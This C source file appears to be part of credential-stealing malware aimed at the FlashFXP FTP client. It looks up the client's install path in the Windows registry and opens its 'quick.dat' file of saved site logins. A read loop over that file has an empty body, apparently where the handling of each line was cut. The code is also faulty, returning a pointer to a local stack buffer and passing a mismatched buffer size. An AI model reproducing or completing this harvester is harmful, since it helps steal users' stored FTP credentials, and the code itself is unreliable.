#include "includes.h" 
#include "extern.h" 


char *_fipath() {
   char _return[MAX_PATH];
   LONG _ret;
   HKEY _hkey;
   DWORD _siz = 128;

   _ret = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\FlashFXP\\3", 0, KEY_READ, &_hkey);
   if(_ret != ERROR_SUCCESS) {
      _ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\FlashFXP\\3", 0, KEY_READ, &_hkey);
      if(_ret != ERROR_SUCCESS) return "NO_INSTALL";
      else _ret = RegQueryValueEx(_hkey, "Install Path", 0, NULL, (LPBYTE)_return, &_siz);      
   }
   else _ret = RegQueryValueEx(_hkey, "Install Path", 0, /*REG_SZ*/NULL, (LPBYTE)_return, &_siz);
   
   if(_ret != ERROR_SUCCESS) {
	   return "NO_INSTALL";
   }
   else {
	   RegCloseKey(_hkey);
	   return &_return[0];
   }
}

int FlashFXP(int parse) { 
	char buf[MAX_PATH];
	char line[128]; 
	FILE *qd; 
	strcpy(buf, _fipath()); 
	if(!strcmp(buf, "NO_INSTALL")) return 0; 
	else strcat(buf, "\\quick.dat"); 
	qd = fopen(buf, "r"); 
	if(qd == NULL) return 0; 
	else { 
		if(!parse) { 
			fclose(qd); 
			return 1; 
		} 
		else { 
			while (fgets(line, 128, qd) != NULL) 
			{ 
				
				Sleep(2000); 
			} 
			fclose(qd); 
			return 1; 
		} 
	} 
}